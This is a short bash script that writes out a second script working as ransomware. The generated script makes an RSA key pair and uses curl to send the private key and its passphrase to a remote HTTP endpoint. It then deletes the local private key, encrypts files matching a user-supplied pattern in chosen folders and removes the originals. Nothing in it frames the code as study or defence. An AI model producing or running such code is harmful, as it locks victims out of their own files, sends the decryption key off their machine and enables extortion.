#!/bin/bash

echo "#!/bin/bash

# Declares the files filter
files_filter=\"$1\"
# Declares the folders fitler
folders_filter=($2)
# Declares the RSA private key length(in bit)
n_bit_key_length=$3
# Declares the REMOTE HTTP ENDPOINT
http_endpoint=$4

# Generates the random private KEY passphare
private_key_passphrase=\$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 64 | head -n 1)

# Generates the private RSA KEY
openssl genrsa -aes256 -out \"/tmp/${USER}@${HOSTNAME}_pvt.pem\" -passout pass:\${private_key_passphrase} \${n_bit_key_length}

# Generates the public RSA KEY
openssl rsa -in \"/tmp/${USER}@${HOSTNAME}_pvt.pem\" -pubout -out /tmp/public.pem -passin pass:\${private_key_passphrase}

# Sends the private_key to the server
curl -F 'certificate=@/tmp/${USER}@${HOSTNAME}_pvt.pem' -F 'passphrase=\${private_key_passphrase}' \${http_endpoint}

# Removes the private RSA KEY
rm -f \"/tmp/${USER}@${HOSTNAME}_pvt.pem\"


#Apply the filter and encrypt the files
filter_result=\$(find \${folders_filter[*]} -regextype posix-extended -regex \$files_filter 2>/dev/null)
for file in \$filter_result; do openssl rsautl -in \"\$file\" -out \"\$file.enc\" -pubin -inkey /tmp/public.pem -encrypt; rm \$file; done
"
